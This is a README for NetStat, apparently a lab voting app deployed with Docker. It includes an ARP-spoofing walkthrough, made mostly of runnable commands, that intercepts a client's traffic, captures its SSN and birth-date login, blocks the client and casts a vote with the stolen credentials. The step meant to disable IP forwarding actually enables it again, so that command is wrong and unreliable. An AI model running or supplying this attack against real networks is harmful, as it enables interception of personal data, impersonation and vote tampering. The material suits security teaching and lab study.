# NetStat

### Install
- [docker](https://docs.docker.com/engine/install/)
- [docker-compose](https://docs.docker.com/compose/install/)

### Deployment

Includes a Backend Service, Frontend Web Server and SQL Database
```sh
git clone https://github.com/tylerferrara/NetStat
cd ./NetStat/backend
# build containers
docker-compose build
# start
docker-compose --env-file .env up
# stop
docker-compose down
# developing
docker-compose -f dev.yaml --env-file .env up
```

### Attack (ARP-Spoofing)

Requires arpspoof found in dsniff package
```sh
sudo apt-get install dsniff
```

We will try to intercept communication between these two machines

Server -> 10.21.4.1

Client -> 10.21.4.4

```sh
# login as super user
su
# find the network device you are using (we use ens3 on our VMs)
ifconfig
# enable ip forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
# start MITM-Attack
NETDEV=ens3         # change this to your network device
SERVER=10.21.4.1    # host machine 1
CLIENT=10.21.4.4    # host machine 4
arpspoof -i $NETDEV -t $SERVER $CLIENT &> /dev/null &
arpspoof -i $NETDEV -t $CLIENT $SERVER &> /dev/null &
```

Now, if you open up wireshark and inspect network traffic, you can see the HTTP packets from the client. So you can catch the client logging into the server and see the payload:
```sh
{
    "SSN":"111110",
    "DOB":"12-10-1991",
    "Eligible":true
}
```
Let's disable the client's connection to the server so they can't cast a vote before us:
```sh
# disable ip forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Now we can cast our vote with the client's credentials:
```sh
curl -X GET \
  -H "Content-type: application/json" \
  -H "Accept: application/json" \
  -d '{"SSN":"111110","DOB":"12-10-1991","Candidate":"Zach"}' \
  "10.21.4.1:8080/vote"
```

To stop the spoofing, we can kill both processes:
```sh
# stop the spoofing 
kill $(pidof arpspoof)
```
